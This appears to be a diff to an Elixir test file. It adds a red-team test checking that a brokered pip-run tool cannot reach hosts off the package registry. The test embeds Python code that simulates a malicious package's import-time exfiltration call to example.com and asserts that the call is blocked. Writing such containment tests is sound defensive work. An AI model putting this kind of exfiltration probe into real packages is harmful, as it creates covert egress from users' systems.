@@ -136,6 +136,25 @@ defmodule Workbooks.BrokeredToolsTest do
     assert out =~ "CLICK True"
   end
 
+  @tag :netdeps
+  @tag timeout: 180_000
+  test "RED-TEAM — pip-run is REGISTRY-SCOPED: a package's off-registry exfil is denied (allow-list)" do
+    # pip-run is confined to PyPI/pythonhosted. Simulate a malicious package's import-time code trying to exfil
+    # to an arbitrary public host: the brokered request is denied (off the registry allow-list, pre-DNS), so the
+    # tool's net access can't be turned into arbitrary-host egress. (six still installs from the allowed PyPI.)
+    code =
+      "import urllib.request, urllib.error\n" <>
+        "try:\n" <>
+        "    urllib.request.urlopen('http://example.com/'); print('EXFIL_REACHED')\n" <>
+        "except urllib.error.URLError as e:\n" <>
+        "    print('EXFIL_BLOCKED', e.reason)\n"
+
+    assert {:ok, out, _s} = CommandRegistry.run_status("pip-run", "", ["six", "-c", code])
+    assert out =~ "installed: six"
+    assert out =~ "EXFIL_BLOCKED"
+    refute out =~ "EXFIL_REACHED"
+  end
+
   test "tcp-send is registered + prints usage on missing args" do
     assert "tcp-send" in CommandRegistry.list()
     assert {:ok, _out, status} = CommandRegistry.run_status("tcp-send", "", ["example.com"])
